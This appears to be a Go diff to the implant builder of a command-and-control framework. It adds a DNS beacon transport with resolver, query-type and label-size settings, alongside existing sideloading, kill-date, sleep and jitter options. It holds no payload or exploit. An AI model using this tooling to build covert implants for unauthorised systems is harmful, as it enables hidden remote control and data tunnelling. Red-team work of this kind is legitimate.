@@ -35,15 +35,26 @@ type GenerateConfig struct {
 	EndTime            string `json:"end_time"`
 	IsSideloading      bool   `json:"is_sideloading"`
 	SideloadingContent string `json:"sideloading_content"`
+	// DNS-specific fields
+	DnsResolvers  string `json:"dns_resolvers"`  // e.g. "8.8.8.8,1.1.1.1,9.9.9.9"
 }
 
 var (
 	ObjectDir_http = "objects_http"
 	ObjectDir_smb  = "objects_smb"
 	ObjectDir_tcp  = "objects_tcp"
+	ObjectDir_dns  = "objects_dns"
 	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
+)
+
+// DNS Constants
+const (
+	dnsDefaultLabelSize = 48
+	dnsMaxLabelSize     = 63
+	dnsFrameHeaderSize  = 5 // flags:1 + origLen:4
+	dnsCompressFlag     = 0x1
 )
 
 func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map[string]any) ([]byte, error) {
@@ -171,6 +182,12 @@ func AgentGenerateProfile(agentConfig string, listenerWM string, listenerMap map
 		params = append(params, int(lWatermark))
 		params = append(params, kill_date)
 
+	case "dns":
+		params, err = buildDNSProfileParams(generateConfig, listenerMap, listenerWM, agentWatermark, kill_date, working_time)
+		if err != nil {
+			return nil, err
+		}
+
 	default:
 		return nil, errors.New("protocol unknown")
 	}
@@ -210,6 +227,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		Filename       string
 		buildPath      string
 		cmdConfig      string
+		extraLibs      string
 		stdout         bytes.Buffer
 		stderr         bytes.Buffer
 	)
@@ -238,6 +256,10 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	} else if protocol == "bind_tcp" {
 		ObjectDir = ObjectDir_tcp
 		ConnectorFile = "ConnectorTCP"
+	} else if protocol == "dns" {
+		ObjectDir = ObjectDir_dns
+		ConnectorFile = "ConnectorDNS"
+		extraLibs = "-lws2_32"
 	} else {
 		return nil, "", errors.New("protocol unknown")
 	}
@@ -280,6 +302,10 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	for _, ofile := range ObjectFiles {
 		Files += ObjectDir + "/" + ofile + Ext + " "
 	}
+	// DNS beacon requires compression module and utilities
+	if protocol == "dns" {
+		Files = appendDNSObjectFiles(Files, ObjectDir, Ext)
+	}
 
 	if generateConfig.Format == "Exe" {
 		Files += ObjectDir + "/main" + Ext
@@ -315,7 +341,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		return nil, "", errors.New("unknown file format")
 	}
 
-	cmdBuild := fmt.Sprintf("%s %s %s -o %s", Compiler, lFlags, Files, buildPath)
+	cmdBuild := fmt.Sprintf("%s %s %s %s -o %s", Compiler, lFlags, Files, extraLibs, buildPath)
 	runnerCmdBuild := exec.Command("sh", "-c", cmdBuild)
 	runnerCmdBuild.Dir = currentDir
 	runnerCmdBuild.Stdout = &stdout
@@ -323,7 +349,7 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 	err = runnerCmdBuild.Run()
 	if err != nil {
 		_ = os.RemoveAll(tempDir)
-		return nil, "", err
+		return nil, "", fmt.Errorf("%v: %s", err, stderr.String())
 	}
 
 	buildContent, err := os.ReadFile(buildPath)
@@ -2054,4 +2080,62 @@ func TerminalWrite(terminalId int, oemCP int, data []byte) ([]byte, error) {
 func TerminalClose(terminalId int) ([]byte, error) {
 	array := []interface{}{COMMAND_JOBS_KILL, terminalId}
 	return PackArray(array)
+}
+
+// DNS Helper Functions
+
+func buildDNSProfileParams(generateConfig GenerateConfig, listenerMap map[string]any,
+	listenerWM string, agentWatermark int64, killDate int, workingTime int) ([]interface{}, error) {
+
+	domain, _ := listenerMap["domain"].(string)
+
+	resolvers := generateConfig.DnsResolvers
+	if resolvers == "" {
+		resolvers, _ = listenerMap["resolvers"].(string)
+	}
+	qtype, _ := listenerMap["qtype"].(string)
+
+	pktSizeF, _ := listenerMap["pkt_size"].(float64)
+	ttlF, _ := listenerMap["ttl"].(float64)
+	labelSizeF, _ := listenerMap["label_size"].(float64)
+
+	pktSize := int(pktSizeF)
+	ttl := int(ttlF)
+	labelSize := int(labelSizeF)
+	if labelSize <= 0 || labelSize > dnsMaxLabelSize {
+		labelSize = dnsDefaultLabelSize
+	}
+
+	seconds, err := parseDurationToSeconds(generateConfig.Sleep)
+	if err != nil {
+		return nil, err
+	}
+
+	lWatermark, _ := strconv.ParseInt(listenerWM, 16, 64)
+
+	params := []interface{}{
+		int(agentWatermark),
+		// ProfileDNS
+		domain,
+		resolvers,
+		qtype,
+		pktSize,
+		labelSize,
+		ttl,
+		// Common tail
+		int(lWatermark),
+		killDate,
+		workingTime,
+		seconds,
+		generateConfig.Jitter,
+	}
+
+	return params, nil
+}
+
+// appendDNSObjectFiles adds DNS-specific object files to the build list.
+func appendDNSObjectFiles(files string, objectDir string, ext string) string {
+	files += objectDir + "/DnsCodec" + ext + " "
+	files += objectDir + "/miniz" + ext + " "
+	return files
 }
